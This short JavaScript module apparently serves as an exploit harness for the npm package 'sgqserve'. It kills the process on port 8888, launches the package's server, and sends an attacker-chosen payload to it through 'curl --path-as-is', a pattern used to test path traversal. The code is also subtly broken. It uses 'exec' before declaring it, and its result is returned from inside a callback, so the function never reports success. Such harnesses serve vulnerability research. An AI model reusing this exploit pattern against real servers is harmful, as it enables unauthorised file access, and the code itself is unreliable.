function exploitFunction(payload) {
  const { execSync } = require("child_process");
  const { sleep } = require("sleep");

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  let server = "node ./node_modules/sgqserve/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  const exec = require("child_process").exec;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(payload)) {
      out = true;
    }
    return out;
  });
}

module.exports = { exploitFunction };